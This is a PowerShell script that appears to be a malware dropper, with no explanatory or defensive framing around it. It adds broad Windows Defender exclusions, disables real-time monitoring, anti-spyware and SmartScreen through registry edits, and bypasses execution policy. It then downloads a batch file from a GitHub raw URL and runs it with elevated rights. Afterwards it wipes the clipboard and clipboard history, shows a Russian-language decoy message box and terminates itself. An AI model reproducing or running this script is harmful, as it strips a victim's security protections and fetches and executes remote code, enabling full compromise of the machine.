$folderPath1 = "C:\Windows\Temp"
$folderPath2 = "C:\"
$folderPath3 = "C:\ProgramData"
$folderPath = "C:\Users"
Add-Type -AssemblyName System.Windows.Forms
Add-MpPreference -ExclusionPath $folderPath
New-Item -ItemType Directory -Path $folderPath1 -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $folderPath2 -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $folderPath3 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue | Out-Null
Add-MpPreference -ExclusionPath $folderPath1 -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $folderPath2 -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $folderPath3 -ErrorAction SilentlyContinue
Set-MpPreference -DisableAutoExclusions $true
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off' -Type String -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureAppInstallControl' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureSmartScreen' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue

$url = "https://raw.githubusercontent.com/serafipka/idkakkwa/refs/heads/main/xdxdxd.bat"
$outputFile = "C:\Users\ccmmmd.bat"
Add-MpPreference -ExclusionPath $outputFile
Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"

$argList = '/c ""' + $outputFile + '""'
Start-Process -FilePath $env:ComSpec -ArgumentList $argList -Verb RunAs

Add-Type -AssemblyName PresentationCore
[System.Windows.Clipboard]::Clear()

[System.Windows.Forms.MessageBox]::Show(
    "Готово, Льюис. Кухня работает.", 
    "Бенч", 
    [System.Windows.Forms.MessageBoxButtons]::OK, 
    [System.Windows.Forms.MessageBoxIcon]::Information
)

function Clear-Clipboard {
    Try {
        Set-Clipboard -Value " "
    } Catch {
    }
}

function Clear-ClipboardHistory {
    Try {
        $clipboardHistoryPath = "HKCU:\Software\Microsoft\Clipboard"
        if (Test-Path $clipboardHistoryPath) {
            Remove-Item -Path $clipboardHistoryPath -Recurse -Force
        } else {
        }
        New-Item -Path $clipboardHistoryPath -Force | Out-Null
    } Catch {
    }
}

Clear-Clipboard
Clear-ClipboardHistory
Stop-Process -Id $PID -Force
